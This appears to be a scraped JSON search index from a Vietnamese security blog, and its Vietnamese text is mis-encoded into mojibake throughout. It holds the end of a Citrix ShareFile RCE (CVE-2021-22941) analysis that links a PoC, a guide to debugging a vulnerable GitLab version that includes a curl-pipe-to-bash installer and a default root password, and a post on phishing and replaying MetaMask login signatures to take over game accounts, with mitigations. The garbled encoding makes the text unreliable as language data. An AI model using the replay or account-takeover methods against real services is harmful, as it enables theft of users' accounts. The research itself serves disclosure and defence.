(asterisk)    Theo https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file#naming-conventions\n M√¨nh c√≥ vi·∫øt 1 m√£ PoC ·ªü ƒë√¢y, c√°c b·∫°n c√≥ th·ªÉ tham kh·∫£o qua nh√© :D\nhttps://github.com/sun-asterisk-research/cybersec-pocs/tree/master/citrix_sharefile\nTham kh·∫£o  https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file#naming-conventions https://codewhitesec.blogspot.com/2021/09/citrix-sharefile-rce-cve-2021-22941.html https://github.com/hoavt184/CVE-2021-22941  ","permalink":"https://minhtuanact.ml/posts/phan-tich-cve-2021-22941-rce-citrix-sharefile-51120/","summary":"C√°i b√†i n√†y m√¨nh ƒë·ªãnh l√™n t·ª´ nƒÉm ngo√°i r·ªìi, m√† ph√¢n t√≠ch xong l·∫°i ƒë·ªÉ ƒë·∫•y, th·∫≠t ra l√† l∆∞·ªùi vi·∫øt l·∫°i n√™n t·ªìn ƒë·ªçng ƒë·∫øn b√¢y gi·ªù ch∆∞a vi·∫øt b√†i ph√¢n t√≠ch l√™n blog ü•≤. Th√¥i th√¨ ng·ªìi vi·∫øt l·∫°i v·ª´a ƒë·ªÉ c√≥ ch·ªó l∆∞u l·∫°i, v·ª´a ƒë·ªÉ nh·ªõ xem m√¨nh ƒë√£ ph√¢n t√≠ch nh·ªØng c√°i g√¨, bi·∫øt ƒë√¢u sau n√†y l·∫°i s·ª≠ d·ª•ng l·∫°i th√¨ sao :D","title":"Ph√¢n t√≠ch CVE-2021-22941, RCE Citrix Sharefile \u003c 5.11.20"},{"content":"Chuy·ªán l√† g·∫ßn ƒë√¢y Gitlab c√≥ b·∫£n Security Release m·ªõi, trong ƒë√≥ c√≥ m·ªôt l·ªói Arbitrary file read via group import feature\tkh√° l√† th√∫ v·ªã, ·∫£nh h∆∞·ªüng ƒë·∫øn t·∫•t c·∫£ c√°c phi√™n b·∫£n GitLab CE/EE c√≥ ƒë·∫ßu l√† 14.5 tr·ªü l√™n n√™n m√¨nh c√πng v·ªõi anh @vigov5 ƒë√£ th·ª≠ setup l√™n research bug n√†y xem sao :D. B·∫°n ƒë·ªçc c√≥ th·ªÉ ƒë·ªçc th√™m th√¥ng tin t·∫°i ƒë√¢y https://about.gitlab.com/releases/2022/01/11/security-release-gitlab-14-6-2-released/#arbitrary-file-read-via-group-import-feature\nM√¨nh ch∆∞a setup debug Ruby on Rails bao gi·ªù, n√™n ƒë√£ m·∫•t 2 ng√†y tr·ªùi setup. Vi·∫øt l√™n ƒë√¢y v·ª´a l√† chia s·∫ª cho b·∫°n ƒë·ªçc c≈©ng nh∆∞ l√† m·ªôt n∆°i l∆∞u tr·ªØ l·ª° m√¨nh c√≥ l·ªói ·ªü ƒë√¢u ƒë√≥ th√¨ c√≤n c√≥ c√°i v√†o ƒë·ªçc l·∫°i =))\nSetup ƒê·ªÉ setup debug Ruby (c·ª• th·ªÉ h∆°n th√¨ l√† setup debug Gitlab) th√¨ b·∫°n c·∫ßn kh√° l√† nhi·ªÅu th·ª© v√† c√≥ nhi·ªÅu c√°ch ƒë·ªÉ debug, m√¨nh ƒë√£ th·ª≠ ƒë∆∞·ª£c 2 c√°ch debug kh√° ·ªïn, nh∆∞ng trong b√†i n√†y ch·∫Øc l√† m√¨nh ch·ªâ vi·∫øt tr·ªçng t√¢m v√†o 1 c√°ch th√¥i, c√°c c√≤n l·∫°i t∆∞∆°ng t·ª± ·∫•y m√† :D. ƒê·∫ßu ti√™n c√°c b·∫°n c·∫ßn:\n Ruby Mine (m√¨nh ch·ªçn IDE n√†y v√¨ ƒë·ªì c·ªßa JetBrains debug l√∫c n√†o c≈©ng ngon) https://www.jetbrains.com/ruby/ Docker (Docker gi√∫p c√†i ƒë·∫∑t m√¥i tr∆∞·ªùng s·∫°ch s·∫Ω, √≠t l·ªói) M·ªôt m√°y t√≠nh c·∫•u h√¨nh ƒë·ªß kho·∫ª, Gitlab kh√° ng·ªën t√†i nguy√™n, c√≤n v·ªõi c√°c project nh·∫π nh√†ng kh√°c th√¨ c·∫•u h√¨nh y·∫øu ch√∫t c≈©ng ƒë∆∞·ª£c Ki√™n tr√¨ ki√™n tr√¨ v√† ki√™n tr√¨ :(   M·ªôt chi·∫øc note nho nh·ªè: M√¥i tr∆∞·ªùng debug c·ªßa m√¨nh hi·ªán t·∫°i ƒëang s·ª≠ d·ª•ng l√† Windows, k·∫øt h·ª£p k√®m v·ªõi WSL2 ƒë·ªÉ ch·∫°y Linux, ƒë·ªëi v·ªõi Linux th√¨ l√†m t∆∞∆°ng t·ª± nh∆∞ng √≠t b∆∞·ªõc h∆°n Windows, c√°c b·∫°n c√≥ th·ªÉ l∆∞·ª£c b·ªè b∆∞·ªõc n·∫øu mu·ªën nh√©.\n Setup env v·ªõi docker  Clone repo https://gitlab.com/gitlab-org/gitlab-development-kit (·ªû ƒë√¢y m√¨nh s·ª≠ d·ª•ng gitlab-deveopment-kit v√¨ ch√≠nh Gitlab c≈©ng b·∫£o r·∫±ng m√¨nh c·∫ßn d√πng c√°i n√†y ƒë·ªÉ tr√°nh g·∫∑p l·ªói trong qu√° tr√¨nh setup, do Gitlab c√≥ qu√° nhi·ªÅu th√†nh ph·∫ßn)  1 2 3  cd gitlab-development-kit docker build -t gdk:base . docker run -it --name gitlab gdk:base bash .   S·ª≠ d·ª•ng c√¢u l·ªánh tr√™n ƒë·ªÉ build m·ªôt image env v·ªõi ruby V√†o trong docker tr√™n, ch·∫°y l·ªánh one line duy nh·∫•t ƒë·ªÉ d·ª±ng m√¥i tr∆∞·ªùng ho√†n ch·ªânh 1  curl \u0026#34;https://gitlab.com/gitlab-org/gitlab-development-kit/-/raw/main/support/install\u0026#34; | bash   L·ªánh n√†y s·∫Ω gi√∫p c√°c b·∫°n c√†i m√¥i tr∆∞·ªùng Gitlab s·∫°ch s·∫Ω, ki·ªÉu g√¨ c≈©ng x√†i ƒë∆∞·ª£c, n·∫øu l·ªói th√¨ g√µ l·∫°i c√°i l·ªánh ƒë√≥ l√† ƒë∆∞·ª£c, khi n√†o b√°o Success th√¨ l√† ok M·ªü m·ªôt terminal kh√°c g√µ l·ªánh 1  docker commit gitlab gdk:ready   ƒë·ªÉ l∆∞u l·∫°i th√†nh docker image, ti·ªán sau n√†y c√≥ s·ª≠ d·ª•ng l·∫°i ƒë·ª° ph·∫£i ng·ªìi ch·ªù build c√°i ƒë·ªëng tr√™n b∆∞·ªõc 3 (l√¢u ph·∫øt ƒë·∫•y) Sau khi l∆∞u xong th√¨ ch√∫ng ta s·∫Ω c√≥ 1 c√°i image t·ª´ 2gb l√™n 12gb =))  1  docker run -it -p 3000:3000 -p 12345:12345 gdk:ready bash   Truy c·∫≠p v√†o trong docker image gdk:ready v·ª´a m·ªõi l∆∞u l·∫°i xong. N·∫øu ·ªü ph·∫ßn n√†y c√°c b·∫°n b·ªã l·ªói kh√¥ng m·ªü ƒë∆∞·ª£c port 3000 th√¨ b√™n d∆∞·ªõi m√¨nh s·∫Ω h∆∞·ªõng d·∫´n c√°ch fix nh√© B√™n trong docker v√†o th∆∞ m·ª•c gitlab-development-kit ch·∫°y 1 2  gdk stop gdk start webpack gitlab-workhorse rails-background-jobs sshd praefect praefect-gitaly-0 redis postgresql   L·ªánh n√†y s·ª≠ d·ª•ng ƒë·ªÉ kh·ªüi ƒë·ªông c√°c d·ªãch v·ª• c·∫ßn thi·∫øt c·ªßa Gitlab  V·∫≠y l√† xong c√°c b∆∞·ªõc d·ª±ng env, ti·∫øp theo ƒë·∫øn b∆∞·ªõc debug v·ªõi RubyMine\nDebug Gitlab v·ªõi Ruby Mine  C√†i ƒë·∫∑t Ruby Mine l√™n Windows/Linux tu·ª≥ √Ω (·ªü ƒë√¢y m√¨nh s·ª≠ d·ª•ng Windows) C√†i ƒë·∫∑t SDK Ruby cho Ruby Mine, ·ªü ƒë√¢y m√¨nh s·ª≠ d·ª•ng WSL2 ƒë·ªÉ c√†i ƒë·∫∑t cho n√≥ ƒë∆°n gi·∫£n, b·∫°n n√†o k th√≠ch d√πng WSL2 th√¨ c√≥ th·ªÉ c√†i Ruby cho Windows t·∫°i https://rubyinstaller.org/downloads/ Tr√™n WSL2 g√µ 1  sudo apt-get install rails   l√† ƒë∆∞·ª£c, ch·ªù x√≠u l√† xong, ·ªü ƒë√¢y m√¨nh ƒëang s·ª≠ d·ª•ng base kali-linux T·∫°i Ruby Mine, v√†o File -\u0026gt; Settings -\u0026gt; Search Ruby SDK and Gems ·ªû th∆∞ m·ª•c gitlab ch·ªçn d·∫•u + -\u0026gt; New remote \u0026hellip; r·ªìi l√†m nh∆∞ h√¨nh l√† xong Ruby Mine c√≥ h·ªó tr·ª£ r·∫•t nhi·ªÅu ki·ªÉu SDK, t·ª´ local t·ªõi remote, r·∫•t l√† ti·ªán üëç Clone repo gitlab tr√™n m√°y local 1  git clone https://gitlab.com/gitlab-org/gitlab   ·ªû ƒë√¢y m√¨nh clone tr√™n WSL2 lu√¥n 1  git checkout v14.6.1-ee   ƒë·ªÉ v·ªÅ version b·ªã l·ªói  Ch√∫ √Ω, tr√™n Docker c√°c b·∫°n c≈©ng checkout v·ªÅ nh√°nh n√†y ƒë·ªÉ ch·∫°y code version n√†y nh√©.\n  Ti·∫øp t·ª•c v√†o Run -\u0026gt; Edit configurations C√°c b·∫°n c√†i ƒë·∫∑t nh∆∞ h√¨nh l√† xong. Ph·∫ßn remote port ƒë·ªÉ l√† 12345 do n√£y m√¨nh c√≥ map port docker 12345 ra ngo√†i r·ªìi. Ph·∫ßn remote root folder th√¨ gi·ªëng nh∆∞ h√¨nh c√≤n ph·∫ßn local root folder th√¨ ƒë·ªÉ ƒë∆∞·ªùng d·∫´n l√† th∆∞ m·ª•c gitlab tr√™n m√°y c√°c b·∫°n.\nPh·∫ßn localport 26162 l√† dispatcher-port, s·ª≠ d·ª•ng ƒë·ªÉ connect multi-process debugging, tuy nhi√™n m√¨nh ƒëang kh√¥ng s·ª≠ d·ª•ng ƒë∆∞·ª£c port n√†y, giao di·ªán th√¨ c·ª© b·∫Øt ƒëi·ªÅn n√™n c·ª© ƒëi·ªÅn v·∫≠y, ph·∫ßn b∆∞·ªõc 6 m√¨nh b·ªè n√≥ ra kh·ªèi command kh·ªüi ch·∫°y server l√† ƒë∆∞·ª£c. Tr√™n container docker g√µ 1  gem install ruby-debug-ide   ƒê·ªÉ c√†i package debug v·ªõi IDE, sau ƒë√≥ ch·∫°y 1  rdebug-ide --host 0.0.0.0 --port 12345 -- bin/rails s -b 0.0.0.0   L√∫c n√†y tr√™n container docker s·∫Ω ch·ªù t√≠n hi·ªáu nh·∫≠n debug t·ª´ Ruby Mine, ·∫•n n√∫t Debug ho·∫∑c Shift + F9 ƒë·ªÉ connect, l√∫c n√†y Ruby Mine s·∫Ω k·∫øt n·ªëi v·ªõi Server th√¥ng qua port 12345 ƒë·ªÉ debug, sau ƒë√≥ ch·ªù server start l√™n l√† ƒë∆∞·ª£c\nTr√™n m√°y local truy c·∫≠p v√†o http://localhost:3000 xem c√≥ v√†o ƒë∆∞·ª£c Gitlab ch∆∞a, n·∫øu v√†o ƒë∆∞·ª£c th√¨ l√† ok :D ƒêƒÉng nh·∫≠p th·ª≠ v·ªõi pass m·∫∑c ƒë·ªãnh root / 5iveL!fe Tuy nhi√™n c√°c b·∫°n s·∫Ω g·∫∑p v·∫•n ƒë·ªÅ l√† k debug ƒë∆∞·ª£c, do default Gitlab ch·∫°y c√≥ nhi·ªÅu Worker, c·∫ßn ph·∫£i t·∫Øt Worker ƒëi ƒë·ªÉ cho n√≥ ch·∫°y Single th√¥i l√† c√≥ th·ªÉ debug ƒë∆∞·ª£c (c·∫£m ∆°n anh @vigov5 r·∫•t nhi·ªÅu v√¨ c√°i n√†y) 1  vim config/puma.rb   L·∫∑p l·∫°i b∆∞·ªõc 6 l√† c√≥ th·ªÉ debug ƒë∆∞·ª£c g√≤i :D   K·∫øt Tr√™n ƒë√¢y l√† m·ªôt c√°ch debug webapp Ruby s·ª≠ d·ª•ng Ruby Mine, c≈©ng c√≥ th·ªÉ s·ª≠ d·ª•ng VSCode debug c≈©ng ƒë∆∞·ª£c, nh∆∞ng c√° nh√¢n m√¨nh th√≠ch Ruby Mine h∆°n v√¨ t√≠nh ti·ªán d·ª•ng c·ªßa n√≥, thay v√¨ docker c√°c b·∫°n c≈©ng c√≥ th·ªÉ s·ª≠ d·ª•ng WSL2 hay c√†i ƒë·∫∑t tr·ª±c ti·∫øp l√™n Windows nh∆∞ng m√† n√≥ c√≥ kh√° nhi·ªÅu l·ªói + Gitlab l√† m·ªôt project kh√° l·ªõn c·∫ßn c√†i ƒë·∫∑t c√°c th√†nh ph·∫ßn b·ªï tr·ª£ kh√° nhi·ªÅu n√™n m√¨nh th·∫•y c√°ch tr√™n c√≥ v·∫ª t·ªëi ∆∞u nh·∫•t, c√°c project kh√°c c√°c b·∫°n c√≥ th·ªÉ l√†m t∆∞∆°ng t·ª±\nExtend L√∫c setup debug m√¨nh c√≥ g·∫∑p m·ªôt l·ªói li√™n quan ƒë·∫øn Windows, n√≥ kh√¥ng cho ph√©p m√¨nh m·ªü port 3000 map t·ª´ Docker ra ngo√†i, ho√° ra l√† n√≥ b·ªã excludedport, c√°ch fix nh∆∞ sau\n1  netsh interface ipv4 show excludedportrange protocol=tcp   S·ª≠ d·ª•ng l·ªánh n√†y ƒë·ªÉ check xem m√¨nh c√≥ ƒëang b·ªã Exclusion port n√†o k, n·∫øu port m√¨nh ƒëang mu·ªën m·ªü ·ªü trong kho·∫£ng start port - end port th√¨ c·∫ßn xo√° n√≥ ƒëi\nM·ªü powershell quy·ªÅn Administrator l√™n\n1 2 3  net stop winnat netsh interface ipv4 delete excludedportrange protocol=tcp startport=2972 numberofports=100 net start winnat   V·ªõi startport v√† numberofport c√°c b·∫°n t·ª± ƒë·ªãnh nghƒ©a nh√©.\nB·∫°n n√†o b·ªã l·ªói migrate db th√¨ l√†m theo nh∆∞ n√†y nha\n1 2 3 4 5 6 7 8 9  gdk@5a16e8ed2f0c:~/gitlab-development-kit/gitlab$ rake db:drop Dropped database \u0026#39;gitlabhq_development\u0026#39; Dropped database \u0026#39;gitlabhq_test\u0026#39; gdk@5a16e8ed2f0c:~/gitlab-development-kit/gitlab$ rake db:create Created database \u0026#39;gitlabhq_development\u0026#39; Created database \u0026#39;gitlabhq_test\u0026#39; gdk@5a16e8ed2f0c:~/gitlab-development-kit/gitlab$ rake db:migrate gdk@5a16e8ed2f0c:~/gitlab-development-kit/gitlab$ rake db:seed:replant gdk@5a16e8ed2f0c:~/gitlab-development-kit/gitlab$ rake db:seed_fu   See you ·ªü b√†i ph√¢n t√≠ch m√¨nh n√™u ngay ƒë·∫ßu nheeeeeee\nRef  https://medium.com/@Bartleby/ports-are-not-available-listen-tcp-0-0-0-0-3000-165892441b9d https://gitlab.com/gitlab-org/gitlab https://gitlab.com/gitlab-org/gitlab-development-kit https://www.jetbrains.com/ruby/  ","permalink":"https://minhtuanact.ml/posts/setup-debug-gitlab-tuong-khong-kho-ma-cung-khong-kho-lam/","summary":"Chuy·ªán l√† g·∫ßn ƒë√¢y Gitlab c√≥ b·∫£n Security Release m·ªõi, trong ƒë√≥ c√≥ m·ªôt l·ªói Arbitrary file read via group import feature\tkh√° l√† th√∫ v·ªã, ·∫£nh h∆∞·ªüng ƒë·∫øn t·∫•t c·∫£ c√°c phi√™n b·∫£n GitLab CE/EE c√≥ ƒë·∫ßu l√† 14.5 tr·ªü l√™n n√™n m√¨nh c√πng v·ªõi anh @vigov5 ƒë√£ th·ª≠ setup l√™n research bug n√†y xem sao :D. B·∫°n ƒë·ªçc c√≥ th·ªÉ ƒë·ªçc th√™m th√¥ng tin t·∫°i ƒë√¢y https://about.gitlab.com/releases/2022/01/11/security-release-gitlab-14-6-2-released/#arbitrary-file-read-via-group-import-feature\nM√¨nh ch∆∞a setup debug Ruby on Rails bao gi·ªù, n√™n ƒë√£ m·∫•t 2 ng√†y tr·ªùi setup.","title":"Setup debug Gitlab, t∆∞·ªüng kh√¥ng kh√≥ m√† c≈©ng kh√¥ng kh√≥ l·∫Øm"},{"content":"Online users ng√†y c√†ng tr·ªü n√™n kh√¥ng th√≠ch (ho·∫∑c c·∫£m th·∫•y kh√≥ ch·ªãu) ƒë·ªëi v·ªõi s·ª≠ d·ª•ng t√≠nh nƒÉng ƒëƒÉng k√Ω truy·ªÅn th·ªëng s·ª≠ d·ª•ng username/email v√† password. H·ªç th√≠ch s·ª≠ d·ª•ng t√≠nh nƒÉng ƒëƒÉng nh·∫≠p ch·ªâ b·∫±ng m·ªôt c√∫ nh·∫•p chu·ªôt th√¥ng qua Facebook, Google ho·∫∑c GitHub h∆°n nhi·ªÅu, ƒë·ª° c·∫ßn ph·∫£i suy nghƒ© xem ƒë·∫∑t m·∫≠t kh·∫©u l√† g√¨, username l√† g√¨, c√≥ c·∫ßn l∆∞u l·∫°i ƒë·ªÉ sau n√†y ƒëƒÉng nh·∫≠p l·∫°i kh√¥ng ..v.v. Tuy nhi√™n, n√≥ ƒëi k√®m v·ªõi m·ªôt s·ª± ƒë√°nh ƒë·ªïi.\n∆Øu ƒëi·ªÉm:  Kh√¥ng c·∫ßn ph·∫£i ƒëi·ªÅn form nhi·ªÅu tr∆∞·ªùng ph·ª©c t·∫°p Kh√¥ng c·∫ßn ph·∫£i nh·ªõ th√™m username/email v√† password kh√°c To√†n b·ªô qu√° tr√¨nh ƒëƒÉng nh·∫≠p m·∫•t v√†i gi√¢y thay v√¨ v√†i ph√∫t.  Nh∆∞·ª£c ƒëi·ªÉm  V√¨ th√¥ng tin user ƒë∆∞·ª£c c·∫≠p nh·∫≠t t·ª´ c√°c nh√† cung c·∫•p kh√°c (Facebook, Google, Github, \u0026hellip;), ƒëi·ªÅu n√†y d·∫≠y l√™n v·∫•n ƒë·ªÅ nh·ª©c nh·ªëi v·ªÅ quy·ªÅn ri√™ng t∆∞ c·ªßa c√°c nh√† cung c·∫•p s·ª≠ d·ª•ng t·∫•t c·∫£ d·ªØ li·ªáu c√° nh√¢n n√†y. V√≠ d·ª•, Facebook ƒëang ph·∫£i ƒë·ªëi m·∫∑t v·ªõi c√°c v·∫•n ƒë·ªÅ v·ªÅ quy·ªÅn ri√™ng t∆∞ d·ªØ li·ªáu.  Tuy nhi√™n, c√≥ m·ªôt ph∆∞∆°ng ph√°p gi·∫£i quy·∫øt v·∫•n ƒë·ªÅ tr√™n m√† c√°c developer blockchain hay s·ª≠ d·ª•ng, ƒëƒÉng nh·∫≠p ch·ªâ v·ªõi 1-click v·ªõi Metamask , hay c√≤n g·ªçi l√† \u0026ldquo;Login with Metamask\u0026rdquo;\nC√≥ v·∫ª r·∫•t l√† ·ªïn ƒë√∫ng kh√¥ng?\nTr√™n h√¨nh ch√∫ng ta c√≥ th·ªÉ th·∫•y r·∫±ng, ch·ªâ c·∫ßn ch√∫ng ta ·∫•n Sign (k√Ω) l√† c√≥ th·ªÉ login v√†o t√†i kho·∫£n game r·ªìi ch∆°i nh∆∞ b√¨nh th∆∞·ªùng th√¥i. C√°ch login kh√¥ng h·ªÅ r∆∞·ªùm r√† v√† ch·∫≥ng l·ªô th√¥ng tin c√° nh√¢n ·ªü ƒë√¢u c·∫£, r·∫•t l√† ti·ªán.\nC∆° ch·∫ø login c≈©ng r·∫•t ƒë∆°n gi·∫£n. √ù t∆∞·ªüng c∆° b·∫£n l√† v·ªÅ m·∫∑t m·∫≠t m√£, ch√∫ng ta c√≥ th·ªÉ ch·ª©ng minh r·∫±ng m√¨nh l√† ch·ªß s·ªü h·ªØu t√†i kho·∫£n n·∫øu ch√∫ng ta k√Ω v√†o m·ªôt ƒëo·∫°n message m√† server y√™u c·∫ßu. N·∫øu b·∫°n g·ª≠i m·ªôt ƒëo·∫°n ch·ªØ k√Ω (signature) ƒë√£ k√Ω v·ªõi message ƒë√≥ t·ªõi server, th√¨ server s·∫Ω coi b·∫°n l√† ch·ªß s·ªü h·ªØu c·ªßa ƒë·ªãa ch·ªâ v√≠ c√¥ng khai ƒë√≥. V·∫≠y n√™n, ho√†n to√†n c√≥ th·ªÉ x√¢y d·ª±ng h·ªá th·ªëng ƒë·ªãnh danh b·∫±ng ph∆∞∆°ng ph√°p n√†y.\nH·ªá th·ªëng login 1-click v·ªõi Metamask\nV·∫≠y th√¨ c√≥ v·∫•n ƒë·ªÅ g√¨ ·ªü ƒë√¢y nh·ªâ? Nh∆∞ b√†i ƒë·∫ßu ti√™n m√¨nh c√≥ ph√¢n t√≠ch t·∫°i L·∫°i hack game Blockchain, truy c·∫≠p v√†o t√†i kho·∫£n b·∫•t k·ª≥ trong game, m√¨nh ƒë√£ c√≥ th·ªÉ truy c·∫≠p v√†o account b·∫•t k·ª≥ c·ªßa m·ªôt game th√¥ng qua ƒë·ªãa ch·ªâ v√≠ c√¥ng khai (public key) c·ªßa ng∆∞·ªùi ƒë√≥. Tuy nhi√™n, c√°c developer c≈©ng r·∫•t √≠t khi g·∫∑p l·ªói s∆° ƒë·∫≥ng nh∆∞ v·∫≠y (nh∆∞ng c≈©ng kh√¥ng ph·∫£i l√† kh√¥ng c√≥, m√¨nh c≈©ng c√≥ khai th√°c ·ªü m·ªôt game kh√°c c≈©ng ƒëƒÉng nh·∫≠p th√¥ng qua public key v√† ƒë∆∞·ª£c th∆∞·ªüng m·ªôt kho·∫£n t∆∞∆°ng x·ª©ng :D)\nTh√¥ng th∆∞·ªùng, developer s·∫Ω y√™u c·∫ßu ch√∫ng ta k√Ω v√†o m·ªôt ƒëo·∫°n message. Tuy nhi√™n, c√°c b·∫°n c√≥ th·ªÉ th·∫•y r·∫±ng khi m√¨nh login v√†o game, m√¨nh ƒë√£ k√Ω v√†o ƒëo·∫°n message c√≥ n·ªôi dung l√† \u0026ldquo;Verify Account\u0026rdquo;. Ch√∫ng ta ƒë√£ bi·∫øt r·∫±ng ch·ªØ k√Ω ƒëi·ªán t·ª≠ th√¨ s·ª≠ d·ª•ng private key ƒë·ªÉ m√£ ho√° v√† public key ƒë·ªÉ gi·∫£i m√£. V·∫≠y th√¨ private key c·ªßa m·ªói v√≠ ch·ªâ c√≥ 1, n·ªôi dung k√Ω c≈©ng ch·ªâ c√≥ 1 =\u0026gt; b·∫£n m√£ c≈©ng ch·ªâ c√≥ 1. ∆† th·∫ø v·∫≠y th√¨ c√≥ th·ªÉ s·ª≠ d·ª•ng l·∫°i b·∫£n m√£ sau khi k√Ω xong ƒë·ªÉ login v√†o game √†?\nTest th·ª≠ xem sao nh√©.\nRequest n√†y c√≥ th·ªÉ th·∫•y r·∫±ng, m√¨nh ƒë√£ g·ª≠i public key v√† signature sau khi m√¨nh k√Ω v√†o ch·ªØ \u0026ldquo;Verify Account\u0026rdquo;, login th√†nh c√¥ng.\nTuy nhi√™n, m√¨nh s·ª≠ d·ª•ng https://www.myetherwallet.com/wallet/sign ƒë·ªÉ l·∫•y v√≠ m√¨nh k√Ω v√†o ch·ªØ \u0026ldquo;Verify Account\u0026rdquo; th√¨ c≈©ng nh·∫≠n ƒë∆∞·ª£c k·∫øt qu·∫£ t∆∞∆°ng t·ª±.\nV·∫≠y l√†, ho√†n to√†n m√¨nh c√≥ th·ªÉ d·ª±ng l√™n m·ªôt trang web, y√™u c·∫ßu m·ªçi ng∆∞·ªùi k√Ω v√†o message \u0026ldquo;Verify Account\u0026rdquo; v√† r·ªìi c√≥ th·ªÉ l·∫•y ƒë∆∞·ª£c signature v√† s·ª≠ d·ª•ng n√≥ ƒë·ªÉ ƒëƒÉng nh·∫≠p v√†o game/·ª©ng d·ª•ng (n·∫øu h·ªç c√≥ ch∆°i game/·ª©ng d·ª•ng ƒë√≥).\nTuy c·∫ßn m·ªôt ch√∫t phishing nh∆∞ng v·ªõi ng∆∞·ªùi d√πng hi·ªán nay, nh·∫•t l√† c∆°n b√£o GameFI ƒëang ƒë·ªï b·ªô, ho√†n to√†n m·ªçi ng∆∞·ªùi s·∫Ω kh√¥ng ƒë·ªÉ √Ω ƒë·∫øn c√°i message ƒë·ªÉ k√Ω ƒë√≥ m√† m·ªçi ng∆∞·ªùi s·∫Ω k√Ω lu√¥n ƒë·ªÉ login v√†o game ch∆°i, ch·ªâ c√≥ ch√∫a m·ªõi bi·∫øt ƒë∆∞·ª£c r·∫±ng h·ªá th·ªëng backend c·ªßa nh·ªØng game ƒë√≥ c√≥ ƒëang thu th·∫≠p Signature c·ªßa ng∆∞·ªùi ch∆°i hay kh√¥ng, h·ªç c√≥ th·ªÉ s·ª≠ d·ª•ng l·∫°i ƒë·ªÉ ƒëƒÉng nh·∫≠p v√†o c√°c game kh√°c n·∫øu c√≥ n·ªôi dung k√Ω t∆∞∆°ng t·ª±.\nV√≠ d·ª• nh∆∞ game n√†y, n·∫øu m√¨nh c√≥ gi√° tr·ªã Signature c·ªßa user th√¨ ch·∫≥ng ph·∫£i m√¨nh c√≥ th·ªÉ ƒë·ªïi password ƒë∆∞·ª£c hay sao ü§î\nUpdate M√¨nh v·ª´a g·∫∑p m·ªôt tr∆∞·ªùng h·ª£p kh√° l√† bu·ªìn c∆∞·ªùi, th·∫•y b·∫°n m√¨nh g·ª≠i cho link n√™n ch·∫≥ng bi·∫øt th·∫ø n√†o, v√†o check xem sao. Th·∫•y b·∫£o game n√†y ƒëang hot l·∫Øm.\nTh√¥ng tin ch·ªØ k√Ω c√≥ ng·∫´u nhi√™n ƒë·∫ßy ƒë·ªß, kh√° x·ªãn x√≤. Check request th√¨ c√≥ v·∫ª r·∫•t an to√†n r·ªìi ch·ª© nh·ªù\nTuy nhi√™n, m√¨nh th·ª≠ k√Ω v·ªõi message v√† sign kh√°c xem sao\nK√Ω v·ªõi ch·ªØ \u0026ldquo;a\u0026rdquo;\n·ªö t·∫°o ƒë∆∞·ª£c session ƒëƒÉng nh·∫≠p th√†nh c√¥ng n√†y, v·∫≠y th√¨ v·ªõi message v√† sign b·∫•t k·ª≥ c·ªßa user n√†o ƒë·ªÅu c√≥ th·ªÉ login ƒë∆∞·ª£c, qu·∫£ l√† ·∫£o ma canada =))\nV·∫≠y l√†m sao ƒë·ªÉ login v·ªõi Metamask an to√†n  S·ª≠ d·ª•ng gi√° tr·ªã Nonce ng·∫´u nhi√™n g·ª≠i c√πng message khi y√™u c·∫ßu user k√Ω Gi√° tr·ªã Nonce h·∫øt h·∫°n sau m·ªôt kho·∫£ng th·ªùi gian nh·∫•t ƒë·ªãnh Thay ƒë·ªïi Nonce khi login th√†nh c√¥ng \u0026hellip;.  Tham kh·∫£o  https://www.toptal.com/ethereum/one-click-login-flows-a-metamask-tutorial  ","permalink":"https://minhtuanact.ml/posts/one-click-login-voi-metamask-su-dung-chu-ky-dien-tu-co-rui-ro-gi/","summary":"Online users ng√†y c√†ng tr·ªü n√™n kh√¥ng th√≠ch (ho·∫∑c c·∫£m th·∫•y kh√≥ ch·ªãu) ƒë·ªëi v·ªõi s·ª≠ d·ª•ng t√≠nh nƒÉng ƒëƒÉng k√Ω truy·ªÅn th·ªëng s·ª≠ d·ª•ng username/email v√† password. H·ªç th√≠ch s·ª≠ d·ª•ng t√≠nh nƒÉng ƒëƒÉng nh·∫≠p ch·ªâ b·∫±ng m·ªôt c√∫ nh·∫•p chu·ªôt th√¥ng qua Facebook, Google ho·∫∑c GitHub h∆°n nhi·ªÅu, ƒë·ª° c·∫ßn ph·∫£i suy nghƒ© xem ƒë·∫∑t m·∫≠t kh·∫©u l√† g√¨, username l√† g√¨, c√≥ c·∫ßn l∆∞u l·∫°i ƒë·ªÉ sau n√†y ƒëƒÉng nh·∫≠p l·∫°i kh√¥ng .","title":"One-click Login v·ªõi Metamask, s·ª≠ d·ª•ng ch·ªØ k√Ω ƒëi·ªán t·ª≠ c√≥ r·ªßi ro g√¨?"},{"content":" Ki·∫øn th·ª©c v·ªÅ Blockchain c·ªßa m√¨nh v·∫´n ƒëang h·∫°n h·∫πp, n·∫øu c√≥ c√¢u n√†o hay ki·∫øn th·ª©c ch·ªó n√†o m√¨nh hi·ªÉu sai th√¨ xin c√°c b·∫°n g√≥p √Ω ·ªü d∆∞·ªõi ph·∫ßn comment nh√©\n D·∫°o g·∫ßn ƒë√¢y m√¨nh c√πng homie c·ªßa m√¨nh c≈©ng hay ƒëi xi√™n c√°c con game Blockchain, do trend NFT game Blockchain ƒëang c·ª±c k·ª≥ n·ªïi b√¢y gi·ªù, nh·∫•t l√† Vi·ªát Nam m√¨nh c√≥ con game Axie Infinity v·ªën ho√° h√†ng t·ª∑ Biden.\nTh·∫≠t ti·∫øc l√† ng√†y x∆∞a - th√°ng 5 v·ª´a r·ªìi - m·ªôt homie kh√°c c·ªßa m√¨nh c≈©ng r·ªß ch∆°i game Axie Infinity m√† m√¨nh l·∫°i kh√¥ng ch∆°i, ch·ª© ch∆°i ƒë·∫øn b√¢y gi·ªù th√¨ c≈©ng \u0026hellip;.\nC√°c b·∫°n c√≥ th·ªÉ ƒë·ªçc b√†i vi·∫øt t·∫°i https://viblo.asia/p/blockchain-do-bo-nen-cong-nghiep-gaming-co-hoi-hay-rui-ro-cung-loi-chia-se-ve-viec-ca-nhan-minh-dang-kiem-them-thu-nhap-bang-cach-choi-cac-blockchain-game-nhu-the-nao-LzD5daVEKjY\nC·ªë g·∫Øng l√™n c√°c b·∫°n, ngh√®o th√¨ l√¢u ch·ª© gi√†u th√¨ m·∫•y ƒë√¢u huhu\nTh√¥i l√≤ng v√≤ng vƒÉn t·ª± th·∫ø ƒë·ªß r·ªìi, v√†o ch·ªß ƒë·ªÅ ch√≠nh th√¥i, l·∫πt g√¢u\nMetamask N·∫øu ai ch∆∞a t·ª´ng ti·∫øp x√∫c 